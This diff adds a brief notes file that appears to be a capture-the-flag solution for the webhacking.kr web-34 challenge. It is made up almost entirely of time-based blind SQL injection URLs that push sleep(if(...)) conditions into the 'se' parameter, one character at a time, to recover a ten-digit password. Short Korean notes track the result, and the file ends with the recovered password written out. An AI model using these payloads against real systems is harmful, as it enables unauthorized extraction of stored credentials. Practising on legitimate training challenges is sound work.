@@ -1,0 +1,41 @@
+Time Based SQL Injection
+
+http://webhacking.kr/challenge/web/web-34/?msg=123&se=sleep(if(length(pw)=10,5,0))
+길이는 10글자
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(pw+regexp+0x5B302D395D,5,0))
+pw 범위는 숫자
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(mid(pw,1,1))
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,1,1)=1,5,0))
+pw: 1
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(mid(pw,2,1))
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,2,1)=0,5,0))
+pw:10
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(mid(pw,3,1))
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,3,1)=5,5,0))
+pw:105
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(mid(pw,4,1))
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,4,1)=8,5,0))
+pw:1058
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,5,1)=7,5,0))
+pw:10587
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,6,1)=9,5,0))
+pw:105879
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,7,1)=2,5,0))
+pw:1058792
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,8,1)=4,5,0))
+pw:10587924
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,9,1)=9,5,0))
+pw:105879249
+
+http://webhacking.kr/challenge/web/web-34/?msg=123456&se=sleep(if(mid(pw,10,1)=5,5,0))
+pw:1058792495
